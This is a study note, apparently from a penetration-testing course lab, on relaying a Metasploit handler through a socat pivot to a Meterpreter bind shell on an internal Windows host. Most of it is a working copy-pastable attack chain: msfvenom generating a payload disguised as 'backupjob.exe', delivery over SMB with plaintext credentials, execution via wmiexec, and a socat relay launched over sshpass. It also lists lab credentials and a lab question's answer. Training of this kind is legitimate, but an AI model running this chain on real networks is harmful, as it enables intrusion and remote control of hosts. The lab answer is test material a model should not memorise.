# 07 — Socat Redirection with a Bind Shell

> The reverse of section 6 — instead of the target connecting out through the pivot, the attack box connects IN through the pivot to a bind shell on the target.

---

## Reverse vs Bind — Direction Comparison

| Type | Who initiates | Flow |
|------|--------------|------|
| **Reverse shell** (§06) | Target connects out | Target → Pivot (socat) → Attack box (handler catches) |
| **Bind shell** (§07) | Attack box connects in | Attack box (handler dials out) → Pivot (socat) → Target (bind listener) |

With a bind shell the target never makes an outbound connection — useful when outbound traffic from the target is blocked but inbound is permitted.

---

## How It Works

```
Attack Box
    │  handler connects OUT to 10.129.202.64:8080 (pivot external IP)
    ▼
Ubuntu Pivot  [socat TCP4-LISTEN:8080 → TCP4:172.16.5.19:8443]
    │  socat forwards the connection inward to Windows target
    ▼
Windows Target  [bind_tcp listening on 0.0.0.0:8443]
    │  accepts the inbound connection, sends Meterpreter stage back
    ▼
meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

---

## Step 1 — Generate Windows Bind Shell Payload

No `LHOST` needed — bind payloads listen, they don't call back:

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o backupjob.exe
```

Transfer and execute on the Windows target. It will silently listen on port `8443`.

---

## Step 2 — Start Socat on the Pivot

Socat listens for the attack box's inbound connection and forwards it to the Windows bind port:

```bash
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

- `TCP4-LISTEN:8080` — waits for the attack box handler to connect in
- `TCP4:172.16.5.19:8443` — forwards that connection to the Windows bind shell

---

## Step 3 — Connect with Multi/Handler

The handler **dials out** (`RHOST`) to the pivot's external IP on socat's port:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64    # pivot's external IP
msf6 exploit(multi/handler) > set LPORT 8080             # socat's listen port on pivot
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080)
```

---

## Port Mapping

| What | IP | Port |
|------|----|------|
| Payload bind port | Windows target (`172.16.5.19`) | `8443` — Windows listens here |
| Socat listens | Pivot (all interfaces) | `8080` — attack box dials here |
| Socat forwards to | Windows target (`172.16.5.19`) | `8443` |
| Handler `RHOST` | Pivot external IP (`10.129.202.64`) | `8080` — socat's listen port |

Key difference from reverse shell setup: handler uses `RHOST` (connects out) instead of `LHOST` (listens).

---

## Full Copy-Pastable Chain

**Step 1 — Generate bind shell payload**

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o /tmp/backupjob.exe
```

**Step 2 — Transfer payload to Windows target**

```bash
# Via SMB if creds available (proxy must be up from previous pivot)
proxychains4 -q smbclient //172.16.5.19/C$ -U 'victor%pass@123' \
  -c 'put /tmp/backupjob.exe Users\victor\Downloads\backupjob.exe'
```

**Step 3 — Execute payload on Windows target (via RDP, WMI, or existing shell)**

```bash
# Via WMI through proxy
proxychains4 -q wmiexec.py INLANEFREIGHT/victor:'pass@123'@172.16.5.19 \
  'C:\Users\victor\Downloads\backupjob.exe'
```

**Step 4 — Start socat on pivot (leave running)**

```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 \
  'socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443 &'
```

**Step 5 — Connect with handler (in msfconsole)**

```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.91.231
set LPORT 8080
run
```

---

## Triage

| Symptom | Fix |
|---------|-----|
| `Connection refused` on handler run | Windows payload not running yet — execute it first, then run handler |
| Handler connects but no stage | Socat not running on pivot — check `ss -tlnp \| grep 8080` on pivot |
| `bind_tcp` payload needs LHOST error | It doesn't — bind payloads have no LHOST, only LPORT |
| Session opens then immediately dies | Port conflict on Windows — try a different LPORT (e.g., 9443) |
| Socat exits after one connection | Missing `fork` — add `,fork` to the listen option |

---

## Key Takeaways

1. **Bind shell = attack box dials out.** Handler uses `RHOST` (the pivot), not `LHOST`.
2. **Payload has no `LHOST`** — bind payloads listen, they never initiate a connection.
3. **Socat's role flips** — in reverse shell it relays outbound traffic; here it relays inbound traffic from the attack box toward the target.
4. Bind shells are useful when the target's outbound connections are blocked but inbound is allowed on specific ports.
5. Always run the bind payload on the target **before** starting the handler — the bind listener must exist before you connect to it.

---

## Lab Solution — Section 7 Skills (May 8, 2026)

**Pivot host:** `10.129.91.231` (ACADEMY-PIVOTING-LINUXPIV)
**Pivot creds:** `ubuntu : HTB_@cademy_stdnt!`
**Internal target:** `172.16.5.19` (Windows)

### Q1 — What Meterpreter payload was used to catch the bind shell session? (full path) → `windows/x64/meterpreter/bind_tcp`

Set in the handler with `set payload windows/x64/meterpreter/bind_tcp`. It's a bind payload so the handler dials out (`RHOST`) rather than listening (`LHOST`).

---

## References

- Previous: [06-Socat_Redirection_with_a_Reverse_Shell.md](06-Socat_Redirection_with_a_Reverse_Shell.md)
- Next: [08-SSH_for_Windows_plink.exe.md](08-SSH_for_Windows_plink.exe.md)
- Socat man page: `man socat`
